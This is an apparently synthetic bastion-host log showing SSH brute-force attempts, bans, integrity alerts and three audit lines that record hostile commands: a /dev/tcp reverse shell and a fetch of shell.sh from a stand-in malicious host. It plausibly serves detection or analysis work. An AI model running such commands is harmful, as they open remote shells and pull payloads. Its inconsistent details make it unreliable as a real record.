+Jun 15 10:09:08 bastion-01 sshd[63163]: Failed password for invalid user admin from 32.152.186.248 port 40206 ssh2
+Jun 15 10:09:12 bastion-01 sshd[21983]: Failed password for invalid user admin from 32.152.186.248 port 43989 ssh2
+Jun 15 10:09:14 bastion-01 sshd[5089]: Failed password for invalid user admin from 32.152.186.248 port 54922 ssh2
+Jun 15 10:09:15 bastion-01 sshd[32025]: error: maximum authentication attempts exceeded for admin from 32.152.186.248 port 58187 ssh2 [preauth]
+Jun 15 10:09:16 bastion-01 fail2ban.actions[1886]: NOTICE [sshd] Ban 32.152.186.248
+Jun 15 10:09:19 bastion-01 systemd[1]: Started apt-daily.service.
+Jun 15 10:09:19 bastion-01 kernel: [49103.994] [UFW BLOCK] IN=eth0 OUT= MAC=1a3d66154824 SRC=32.152.186.248 DST=10.0.1.18 LEN=40 TOS=0x00 PREC=0x00 TTL=240 PROTO=TCP SPT=18974 DPT=8080 WINDOW=1024 SYN
+Jun 15 10:09:22 bastion-01 CRON[58100]: (root) CMD (/usr/bin/logrotate /etc/logrotate.conf)
+Jun 15 10:09:23 bastion-01 sshd[44885]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=140.87.216.251
+Jun 15 10:09:26 bastion-01 systemd[1]: Started cron.service.
+Jun 15 10:09:29 bastion-01 audit[50360]: type=EXECVE msg=audit(566.404:169): argc=3 a0="/bin/bash" a1="-c" a2="/dev/tcp/10.0.0.1/4444"
+Jun 15 10:09:34 bastion-01 audit[36094]: type=ANOMALY_RESP msg=audit(569.805): op=PAM:bad_ident acct="?" exe="/usr/sbin/sshd" hostname=? addr=32.152.186.248 terminal=ssh res=failed
+Jun 15 10:09:38 bastion-01 sudo[38376]:   daemon : user NOT in sudoers ; TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash
+Jun 15 10:09:39 bastion-01 CRON[40133]: (root) CMD (/usr/bin/logrotate /etc/logrotate.conf)
+Jun 15 10:09:40 bastion-01 sshd[1929]: Failed password for ubuntu from 12.150.227.36 port 50743 ssh2
+Jun 15 10:09:42 bastion-01 sshd[33731]: Failed password for ubuntu from 12.150.227.36 port 39665 ssh2
+Jun 15 10:09:46 bastion-01 sshd[18223]: Failed password for invalid user ubuntu from 12.150.227.36 port 56632 ssh2
+Jun 15 10:09:47 bastion-01 sshd[62821]: Failed password for ubuntu from 12.150.227.36 port 59527 ssh2
+Jun 15 10:09:48 bastion-01 sshd[3391]: Failed password for ubuntu from 12.150.227.36 port 36386 ssh2
+Jun 15 10:09:53 bastion-01 sshd[28536]: error: maximum authentication attempts exceeded for ubuntu from 12.150.227.36 port 42298 ssh2 [preauth]
+Jun 15 10:09:54 bastion-01 fail2ban.actions[9947]: NOTICE [sshd] Ban 12.150.227.36
+Jun 15 10:09:55 bastion-01 portsentry[6703]: attackalert: Connect from host: 32.152.186.248 to TCP port: 430
+Jun 15 10:09:57 bastion-01 portsentry[1235]: attackalert: Host 32.152.186.248 has been blocked via iptables
+Jun 15 10:09:59 bastion-01 systemd[1]: Started cron.service.
+Jun 15 10:09:59 bastion-01 ntpd[1528]: adjusting local clock by 0.319052s
+Jun 15 10:10:03 bastion-01 sshd[28908]: Accepted publickey for admin from 10.0.10.117 port 56895 ssh2: RSA SHA256:17e90a5abd832a5a02fd03d4461edf8a
+Jun 15 10:10:05 bastion-01 sshd[51140]: pam_unix(sshd:session): session opened for user admin(uid=1997) by (uid=0)
+Jun 15 10:10:08 bastion-01 sshd[36570]: Failed password for invalid user git from 32.152.186.248 port 40659 ssh2
+Jun 15 10:10:10 bastion-01 sshd[42556]: Failed password for invalid user git from 32.152.186.248 port 58671 ssh2
+Jun 15 10:10:10 bastion-01 sshd[6742]: Failed password for git from 32.152.186.248 port 36502 ssh2
+Jun 15 10:10:13 bastion-01 sshd[41387]: Failed password for invalid user git from 32.152.186.248 port 31076 ssh2
+Jun 15 10:10:16 bastion-01 sshd[42518]: Failed password for invalid user git from 32.152.186.248 port 36534 ssh2
+Jun 15 10:10:18 bastion-01 sshd[44759]: Failed password for git from 32.152.186.248 port 32138 ssh2
+Jun 15 10:10:19 bastion-01 sshd[14885]: error: maximum authentication attempts exceeded for git from 32.152.186.248 port 57567 ssh2 [preauth]
+Jun 15 10:10:23 bastion-01 fail2ban.actions[8448]: NOTICE [sshd] Ban 32.152.186.248
+Jun 15 10:10:25 bastion-01 sudo[57121]:   www-data : user NOT in sudoers ; TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash
+Jun 15 10:10:30 bastion-01 ntpd[1450]: adjusting local clock by -0.087065s
+Jun 15 10:10:33 bastion-01 CRON[49572]: (root) CMD (/usr/bin/logrotate /etc/logrotate.conf)
+Jun 15 10:10:36 bastion-01 sshd[21145]: Failed password for invalid user test from 140.87.216.251 port 47334 ssh2
+Jun 15 10:10:39 bastion-01 sshd[59994]: Failed password for test from 140.87.216.251 port 30272 ssh2
+Jun 15 10:10:41 bastion-01 sshd[11051]: Failed password for invalid user test from 140.87.216.251 port 31720 ssh2
+Jun 15 10:10:46 bastion-01 sshd[54741]: Failed password for test from 140.87.216.251 port 64010 ssh2
+Jun 15 10:10:50 bastion-01 sshd[12168]: Failed password for test from 140.87.216.251 port 51960 ssh2
+Jun 15 10:10:53 bastion-01 sshd[37420]: Failed password for test from 140.87.216.251 port 45848 ssh2
+Jun 15 10:10:53 bastion-01 sshd[55299]: Failed password for invalid user test from 140.87.216.251 port 55776 ssh2
+Jun 15 10:10:58 bastion-01 sshd[9445]: error: maximum authentication attempts exceeded for test from 140.87.216.251 port 58121 ssh2 [preauth]
+Jun 15 10:11:03 bastion-01 fail2ban.actions[7396]: NOTICE [sshd] Ban 140.87.216.251
+Jun 15 10:11:05 bastion-01 nginx: SSL: error:0A000086:SSL routines::certificate verify failed (certificate has expired)
+Jun 15 10:11:08 bastion-01 certbot: Certificate for domain auth.example.com expires in 1 days!
+Jun 15 10:11:10 bastion-01 kernel: [82470.262] [UFW BLOCK] IN=eth0 OUT= MAC=6cfd16814d1e SRC=32.152.186.248 DST=10.0.1.162 LEN=40 TOS=0x00 PREC=0x00 TTL=240 PROTO=TCP SPT=38833 DPT=8080 WINDOW=1024 SYN
+Jun 15 10:11:10 bastion-01 ntpd[917]: adjusting local clock by -0.406746s
+Jun 15 10:11:10 bastion-01 sudo[51464]:   daemon : user NOT in sudoers ; TTY=pts/4 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash
+Jun 15 10:11:10 bastion-01 portsentry[2290]: attackalert: Connect from host: 12.150.227.36 to TCP port: 784
+Jun 15 10:11:13 bastion-01 portsentry[3138]: attackalert: Host 12.150.227.36 has been blocked via iptables
+Jun 15 10:11:18 bastion-01 sshd[17072]: Accepted publickey for deploy from 10.0.5.48 port 44532 ssh2: RSA SHA256:161d034c8bc59e31421a1189302d28d7
+Jun 15 10:11:21 bastion-01 sshd[53893]: pam_unix(sshd:session): session opened for user deploy(uid=1798) by (uid=0)
+Jun 15 10:11:21 bastion-01 CRON[44205]: (root) CMD (/usr/bin/logrotate /etc/logrotate.conf)
+Jun 15 10:11:21 bastion-01 kernel: [70178.710] [UFW BLOCK] IN=eth0 OUT= MAC=00c79fa0ec05 SRC=32.152.186.248 DST=10.0.1.164 LEN=40 TOS=0x00 PREC=0x00 TTL=240 PROTO=TCP SPT=38992 DPT=80 WINDOW=1024 SYN
+Jun 15 10:11:24 bastion-01 sshd[6071]: Failed password for oracle from 32.152.186.248 port 36080 ssh2
+Jun 15 10:11:24 bastion-01 sshd[26611]: Failed password for oracle from 32.152.186.248 port 43629 ssh2
+Jun 15 10:11:24 bastion-01 sshd[28115]: Failed password for invalid user oracle from 32.152.186.248 port 31438 ssh2
+Jun 15 10:11:29 bastion-01 sshd[14781]: Failed password for invalid user oracle from 32.152.186.248 port 35001 ssh2
+Jun 15 10:11:32 bastion-01 sshd[42520]: Failed password for invalid user oracle from 32.152.186.248 port 50551 ssh2
+Jun 15 10:11:34 bastion-01 sshd[12783]: error: maximum authentication attempts exceeded for oracle from 32.152.186.248 port 40558 ssh2 [preauth]
+Jun 15 10:11:35 bastion-01 fail2ban.actions[1166]: NOTICE [sshd] Ban 32.152.186.248
+Jun 15 10:11:39 bastion-01 sshd[32713]: Accepted publickey for deploy from 10.0.10.156 port 37681 ssh2: RSA SHA256:7f9fd5f9fd6cc25782b765fe66d1c658
+Jun 15 10:11:39 bastion-01 sshd[36814]: pam_unix(sshd:session): session opened for user deploy(uid=1614) by (uid=0)
+Jun 15 10:11:44 bastion-01 nginx: SSL: error:0A000086:SSL routines::certificate verify failed (certificate has expired)
+Jun 15 10:11:45 bastion-01 certbot: Certificate for domain www.example.com expires in 0 days!
+Jun 15 10:11:46 bastion-01 portsentry[1377]: attackalert: Connect from host: 12.150.227.36 to TCP port: 313
+Jun 15 10:11:46 bastion-01 portsentry[6978]: attackalert: Host 12.150.227.36 has been blocked via iptables
+Jun 15 10:11:47 bastion-01 ntpd[560]: adjusting local clock by -0.172460s
+Jun 15 10:11:52 bastion-01 sshd[23842]: Failed password for invalid user oracle from 32.152.186.248 port 36027 ssh2
+Jun 15 10:11:57 bastion-01 sshd[31608]: Failed password for oracle from 32.152.186.248 port 49288 ssh2
+Jun 15 10:12:00 bastion-01 sshd[34597]: Failed password for oracle from 32.152.186.248 port 58577 ssh2
+Jun 15 10:12:01 bastion-01 sshd[12335]: Failed password for oracle from 32.152.186.248 port 46390 ssh2
+Jun 15 10:12:04 bastion-01 sshd[64037]: Failed password for oracle from 32.152.186.248 port 48421 ssh2
+Jun 15 10:12:08 bastion-01 sshd[39249]: error: maximum authentication attempts exceeded for oracle from 32.152.186.248 port 36743 ssh2 [preauth]
+Jun 15 10:12:09 bastion-01 fail2ban.actions[6105]: NOTICE [sshd] Ban 32.152.186.248
+Jun 15 10:12:14 bastion-01 CRON[63505]: (root) CMD (/usr/bin/logrotate /etc/logrotate.conf)
+Jun 15 10:12:17 bastion-01 aide[8309]: AIDE found differences between database and filesystem!!
+Jun 15 10:12:21 bastion-01 aide[5451]: changed: /etc/sudoers
+Jun 15 10:12:26 bastion-01 sshd[59844]: Failed password for deploy from 169.0.127.77 port 54507 ssh2
+Jun 15 10:12:26 bastion-01 sshd[11960]: Failed password for deploy from 169.0.127.77 port 59452 ssh2
+Jun 15 10:12:29 bastion-01 sshd[39461]: Failed password for deploy from 169.0.127.77 port 46584 ssh2
+Jun 15 10:12:32 bastion-01 sshd[24085]: Failed password for invalid user deploy from 169.0.127.77 port 64766 ssh2
+Jun 15 10:12:33 bastion-01 sshd[8513]: error: maximum authentication attempts exceeded for deploy from 169.0.127.77 port 31962 ssh2 [preauth]
+Jun 15 10:12:36 bastion-01 fail2ban.actions[6286]: NOTICE [sshd] Ban 169.0.127.77
+Jun 15 10:12:37 bastion-01 CRON[24445]: (root) CMD (/usr/bin/logrotate /etc/logrotate.conf)
+Jun 15 10:12:39 bastion-01 sshd[1631]: Failed password for postgres from 140.87.216.251 port 38015 ssh2
+Jun 15 10:12:42 bastion-01 sshd[15009]: Failed password for postgres from 140.87.216.251 port 51552 ssh2
+Jun 15 10:12:43 bastion-01 sshd[59900]: Failed password for postgres from 140.87.216.251 port 51073 ssh2
+Jun 15 10:12:47 bastion-01 sshd[19586]: Failed password for postgres from 140.87.216.251 port 55270 ssh2
+Jun 15 10:12:48 bastion-01 sshd[35554]: error: maximum authentication attempts exceeded for postgres from 140.87.216.251 port 43905 ssh2 [preauth]
+Jun 15 10:12:52 bastion-01 fail2ban.actions[2686]: NOTICE [sshd] Ban 140.87.216.251
+Jun 15 10:12:55 bastion-01 kernel: [99408.874] [UFW BLOCK] IN=eth0 OUT= MAC=fcd13ef223e2 SRC=12.150.227.36 DST=10.0.1.207 LEN=40 TOS=0x00 PREC=0x00 TTL=240 PROTO=TCP SPT=57379 DPT=80 WINDOW=1024 SYN
+Jun 15 10:12:58 bastion-01 sudo[13985]:   nobody : user NOT in sudoers ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash
+Jun 15 10:13:01 bastion-01 aide[5496]: AIDE found differences between database and filesystem!!
+Jun 15 10:13:04 bastion-01 aide[2953]: changed: /etc/passwd
+Jun 15 10:13:06 bastion-01 nginx: SSL: error:0A000086:SSL routines::certificate verify failed (certificate has expired)
+Jun 15 10:13:07 bastion-01 certbot: Certificate for domain auth.example.com expires in 3 days!
+Jun 15 10:13:10 bastion-01 portsentry[1292]: attackalert: Connect from host: 140.87.216.251 to TCP port: 10
+Jun 15 10:13:11 bastion-01 portsentry[5659]: attackalert: Host 140.87.216.251 has been blocked via iptables
+Jun 15 10:13:11 bastion-01 systemd[1]: Started logrotate.service.
+Jun 15 10:13:16 bastion-01 ntpd[1580]: adjusting local clock by -0.460880s
+Jun 15 10:13:18 bastion-01 sshd[21787]: Failed password for admin from 169.0.127.77 port 48001 ssh2
+Jun 15 10:13:22 bastion-01 sshd[33362]: Failed password for invalid user admin from 169.0.127.77 port 50524 ssh2
+Jun 15 10:13:25 bastion-01 sshd[46643]: Failed password for invalid user admin from 169.0.127.77 port 49558 ssh2
+Jun 15 10:13:27 bastion-01 sshd[56251]: Failed password for invalid user admin from 169.0.127.77 port 37956 ssh2
+Jun 15 10:13:28 bastion-01 sshd[2919]: Failed password for admin from 169.0.127.77 port 36733 ssh2
+Jun 15 10:13:28 bastion-01 sshd[10092]: Failed password for invalid user admin from 169.0.127.77 port 30681 ssh2
+Jun 15 10:13:33 bastion-01 sshd[57451]: error: maximum authentication attempts exceeded for admin from 169.0.127.77 port 51158 ssh2 [preauth]
+Jun 15 10:13:34 bastion-01 fail2ban.actions[8138]: NOTICE [sshd] Ban 169.0.127.77
+Jun 15 10:13:35 bastion-01 nginx: SSL: error:0A000086:SSL routines::certificate verify failed (certificate has expired)
+Jun 15 10:13:39 bastion-01 certbot: Certificate for domain auth.example.com expires in 2 days!
+Jun 15 10:13:41 bastion-01 ntpd[1909]: adjusting local clock by 0.368015s
+Jun 15 10:13:43 bastion-01 ntpd[588]: adjusting local clock by -0.389196s
+Jun 15 10:13:46 bastion-01 sshd[39237]: Failed password for deploy from 140.87.216.251 port 39028 ssh2
+Jun 15 10:13:47 bastion-01 sshd[57485]: Failed password for invalid user deploy from 140.87.216.251 port 50927 ssh2
+Jun 15 10:13:50 bastion-01 sshd[42740]: Failed password for deploy from 140.87.216.251 port 57085 ssh2
+Jun 15 10:13:51 bastion-01 sshd[35576]: Failed password for deploy from 140.87.216.251 port 64194 ssh2
+Jun 15 10:13:53 bastion-01 sshd[64986]: Failed password for deploy from 140.87.216.251 port 62119 ssh2
+Jun 15 10:13:58 bastion-01 sshd[51635]: error: maximum authentication attempts exceeded for deploy from 140.87.216.251 port 51096 ssh2 [preauth]
+Jun 15 10:13:59 bastion-01 fail2ban.actions[8908]: NOTICE [sshd] Ban 140.87.216.251
+Jun 15 10:14:04 bastion-01 sshd[44219]: Failed password for admin from 140.87.216.251 port 45884 ssh2
+Jun 15 10:14:04 bastion-01 sshd[46545]: Failed password for admin from 140.87.216.251 port 43493 ssh2
+Jun 15 10:14:05 bastion-01 sshd[4949]: Failed password for invalid user admin from 140.87.216.251 port 62414 ssh2
+Jun 15 10:14:08 bastion-01 sshd[31680]: Failed password for invalid user admin from 140.87.216.251 port 44164 ssh2
+Jun 15 10:14:09 bastion-01 sshd[23311]: Failed password for invalid user admin from 140.87.216.251 port 36850 ssh2
+Jun 15 10:14:11 bastion-01 sshd[34680]: error: maximum authentication attempts exceeded for admin from 140.87.216.251 port 64579 ssh2 [preauth]
+Jun 15 10:14:16 bastion-01 fail2ban.actions[6108]: NOTICE [sshd] Ban 140.87.216.251
+Jun 15 10:14:20 bastion-01 aide[3523]: AIDE found differences between database and filesystem!!
+Jun 15 10:14:21 bastion-01 aide[2731]: changed: /etc/shadow
+Jun 15 10:14:25 bastion-01 ntpd[1289]: adjusting local clock by 0.475065s
+Jun 15 10:14:26 bastion-01 sshd[52119]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=169.0.127.77
+Jun 15 10:14:29 bastion-01 sshd[10652]: Failed password for invalid user ubuntu from 169.0.127.77 port 36688 ssh2
+Jun 15 10:14:29 bastion-01 sshd[16765]: Failed password for ubuntu from 169.0.127.77 port 37222 ssh2
+Jun 15 10:14:29 bastion-01 sshd[18482]: Failed password for ubuntu from 169.0.127.77 port 42257 ssh2
+Jun 15 10:14:31 bastion-01 sshd[30664]: Failed password for invalid user ubuntu from 169.0.127.77 port 64792 ssh2
+Jun 15 10:14:34 bastion-01 sshd[24227]: Failed password for invalid user ubuntu from 169.0.127.77 port 35509 ssh2
+Jun 15 10:14:37 bastion-01 sshd[33911]: Failed password for invalid user ubuntu from 169.0.127.77 port 56013 ssh2
+Jun 15 10:14:39 bastion-01 sshd[29923]: Failed password for ubuntu from 169.0.127.77 port 33483 ssh2
+Jun 15 10:14:42 bastion-01 sshd[43508]: Failed password for invalid user ubuntu from 169.0.127.77 port 33220 ssh2
+Jun 15 10:14:44 bastion-01 sshd[13709]: error: maximum authentication attempts exceeded for ubuntu from 169.0.127.77 port 57694 ssh2 [preauth]
+Jun 15 10:14:47 bastion-01 fail2ban.actions[4103]: NOTICE [sshd] Ban 169.0.127.77
+Jun 15 10:14:49 bastion-01 nginx: SSL: error:0A000086:SSL routines::certificate verify failed (certificate has expired)
+Jun 15 10:14:52 bastion-01 certbot: Certificate for domain auth.example.com expires in 4 days!
+Jun 15 10:14:57 bastion-01 sshd[8155]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=66.17.43.251
+Jun 15 10:14:59 bastion-01 kernel: [41295.167] [UFW BLOCK] IN=eth0 OUT= MAC=3c6136387c1d SRC=66.17.43.251 DST=10.0.1.14 LEN=40 TOS=0x00 PREC=0x00 TTL=240 PROTO=TCP SPT=59682 DPT=22 WINDOW=1024 SYN
+Jun 15 10:15:03 bastion-01 sshd[19052]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=32.152.186.248
+Jun 15 10:15:05 bastion-01 sshd[46330]: Accepted publickey for admin from 10.0.6.101 port 36639 ssh2: RSA SHA256:67994a38ba77e2bbca29f6d2a8b928e1
+Jun 15 10:15:06 bastion-01 sshd[14481]: pam_unix(sshd:session): session opened for user admin(uid=1507) by (uid=0)
+Jun 15 10:15:11 bastion-01 CRON[23782]: (root) CMD (/usr/bin/logrotate /etc/logrotate.conf)
+Jun 15 10:15:14 bastion-01 kernel: [50019.973] [UFW BLOCK] IN=eth0 OUT= MAC=baf7b849dfbb SRC=12.150.227.36 DST=10.0.1.1 LEN=40 TOS=0x00 PREC=0x00 TTL=240 PROTO=TCP SPT=7200 DPT=443 WINDOW=1024 SYN
+Jun 15 10:15:19 bastion-01 ntpd[988]: adjusting local clock by -0.329767s
+Jun 15 10:15:22 bastion-01 sshd[44649]: Failed password for invalid user postgres from 32.152.186.248 port 30834 ssh2
+Jun 15 10:15:24 bastion-01 sshd[12633]: Failed password for invalid user postgres from 32.152.186.248 port 31364 ssh2
+Jun 15 10:15:24 bastion-01 sshd[45512]: Failed password for postgres from 32.152.186.248 port 41188 ssh2
+Jun 15 10:15:24 bastion-01 sshd[39217]: Failed password for postgres from 32.152.186.248 port 61052 ssh2
+Jun 15 10:15:24 bastion-01 sshd[31970]: Failed password for invalid user postgres from 32.152.186.248 port 46220 ssh2
+Jun 15 10:15:29 bastion-01 sshd[38176]: Failed password for invalid user postgres from 32.152.186.248 port 31139 ssh2
+Jun 15 10:15:30 bastion-01 sshd[55746]: error: maximum authentication attempts exceeded for postgres from 32.152.186.248 port 49048 ssh2 [preauth]
+Jun 15 10:15:34 bastion-01 fail2ban.actions[9606]: NOTICE [sshd] Ban 32.152.186.248
+Jun 15 10:15:35 bastion-01 nginx: SSL: error:0A000086:SSL routines::certificate verify failed (certificate has expired)
+Jun 15 10:15:37 bastion-01 certbot: Certificate for domain api.example.com expires in 0 days!
+Jun 15 10:15:40 bastion-01 systemd[1]: Started logrotate.service.
+Jun 15 10:15:44 bastion-01 aide[6747]: AIDE found differences between database and filesystem!!
+Jun 15 10:15:46 bastion-01 aide[5216]: changed: /etc/ssh/sshd_config
+Jun 15 10:15:48 bastion-01 audit[1888]: type=EXECVE msg=audit(946.947:362): argc=4 a0="/bin/bash" a1="-c" a2="http://malicious.example.com/shell.sh"
+Jun 15 10:15:49 bastion-01 audit[45943]: type=ANOMALY_RESP msg=audit(948.631): op=PAM:bad_ident acct="?" exe="/usr/sbin/sshd" hostname=? addr=66.17.43.251 terminal=ssh res=failed
+Jun 15 10:15:50 bastion-01 ntpd[951]: adjusting local clock by 0.159367s
+Jun 15 10:15:50 bastion-01 audit[3025]: type=EXECVE msg=audit(950.350:592): argc=5 a0="/bin/bash" a1="-O" a2="base64 -d"
+Jun 15 10:15:52 bastion-01 audit[13703]: type=ANOMALY_RESP msg=audit(950.486): op=PAM:bad_ident acct="?" exe="/usr/sbin/sshd" hostname=? addr=66.17.43.251 terminal=ssh res=failed
+Jun 15 10:15:56 bastion-01 systemd[1]: Started apt-daily.service.
+Jun 15 10:16:00 bastion-01 ntpd[1420]: adjusting local clock by 0.487332s
+Jun 15 10:16:05 bastion-01 nginx: SSL: error:0A000086:SSL routines::certificate verify failed (certificate has expired)
+Jun 15 10:16:08 bastion-01 certbot: Certificate for domain www.example.com expires in 2 days!
